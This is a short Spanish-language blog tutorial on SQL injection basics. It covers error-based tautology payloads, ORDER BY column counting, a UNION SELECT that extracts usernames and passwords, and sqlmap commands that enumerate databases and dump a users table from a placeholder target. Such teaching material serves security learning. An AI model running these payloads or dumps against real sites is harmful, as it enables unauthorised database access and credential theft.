---
layout: post
title: "SQL Injection: Conceptos Básicos"
read_time: ""
date: 2026-04-08
tags: [sqli, web, mysql, bypass, union]
description: "Introducción a SQL Injection: detección, explotación básica y herramientas."
---

SQL Injection sigue siendo una de las vulnerabilidades más comunes. Aquí los fundamentos.

## Detección

Prueba básica: añadir `'` al parámetro y observar errores.

```
https://target.com/item?id=1'
```

Error tipo `You have an error in your SQL syntax` confirma SQLi.

## Error-based

```sql
' OR 1=1 --
' OR '1'='1
```

## UNION-based

Primero determina el número de columnas:

```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--  -- hasta que dé error
```

Luego extrae datos:

```sql
' UNION SELECT null,username,password FROM users--
```

## SQLMap

```bash
sqlmap -u "https://target.com/item?id=1" --dbs
sqlmap -u "https://target.com/item?id=1" -D mydb --tables
sqlmap -u "https://target.com/item?id=1" -D mydb -T users --dump
```

## Recursos

- [PortSwigger SQLi](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
